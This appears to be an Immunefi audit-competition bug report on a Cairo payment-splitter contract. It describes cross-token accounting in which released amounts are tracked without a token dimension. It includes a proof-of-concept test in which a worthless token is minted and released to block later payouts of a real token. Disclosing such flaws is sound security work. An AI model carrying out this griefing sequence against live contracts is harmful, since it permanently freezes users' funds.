# 57515 sc high cross token accounting is broken

**Submitted on Oct 26th 2025 at 21:25:50 UTC by @Hunterrrr for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57515
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/receiver/receiver.cairo>

Impacts:

* Permanent freezing of funds
* Permanent freezing of unclaimed royalties
* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

Cross‑token accounting is broken

Your interface lets callers choose a payment\_token for every payout:

```rust
fn releaseAll(ref self: TState, payment_token: ContractAddress);
fn release(ref self: TState, payment_token: ContractAddress, to: ContractAddress);
```

…but the bookkeeping accessors do not take a token parameter:

```rust
fn totalReleased(self: @TState) -> u256;
fn released(self: @TState, account: ContractAddress) -> u256;
```

That mismatch almost certainly means the implementation tracks released and totalReleased globally rather than per token. In any PaymentSplitter‑style contract that supports multiple ERC‑20s (as your payment\_token args suggest), accounting must be token‑scoped. Otherwise, payouts in one token contaminate the math for other tokens.

For a given account, the releasable amount for a token should be:

```
releasable(token, account)
  = (totalReceived(token) * shares(account) / totalShares)
    - released(token, account)
```

If released(account) is tracked without the token dimension:

* A payout in token (A) increases released(account) and will be subtracted when releasing token (B), even though they’re different assets/denominations.
* An attacker (or even a well‑meaning third party—since release is typically permissionless) can send a worthless token to the contract and call release(worthlessToken, victim) to inflate released(victim). Later, when real tokens arrive, releasable(realToken, victim) underflows/zeros out and the victim can’t withdraw. That’s a permanent DoS on payouts for that account and token, leaving funds stuck.

This is not theoretical—mixing accounting across assets is one of the most common PaymentSplitter bugs and results in loss of funds or permanent inability to withdraw.

## Proof of Concept

```c
// Add this test to src/tests/test_receiver.cairo

#[test]
#[should_panic(expected: 'Account not due payment')]
fn test_cross_token_accounting_dos() {
    // Deploy standard setup: receiver + real token A
    let (_, _, _receiver, erc20_a) = deploy_factory_nft_receiver_erc20(true, true);
    let receiver = IReceiverDispatcher { contract_address: _receiver };

    // Deploy a second ERC20 (worthless token B)
    let erc20mock_class = declare("ERC20Mock").unwrap().contract_class();
    let (erc20_b, _) = erc20mock_class.deploy(@array![]).unwrap();

    // 1) Attack: fund receiver with token B and release to inflate released(CREATOR)
    IERC20MintableDispatcher { contract_address: erc20_b }.mint(_receiver, 1000000);
    receiver.release(erc20_b, constants::CREATOR());
    assert_eq!(receiver.released(constants::CREATOR()), 800000);

    // 2) Later, real funds arrive in token A
    IERC20MintableDispatcher { contract_address: erc20_a }.mint(_receiver, 100000);

    // 3) Releasing token A should now revert (cross-token contamination):
    // to_release == 0 due to global released/total_released being polluted by token B
    receiver.release(erc20_a, constants::CREATOR());
}
```
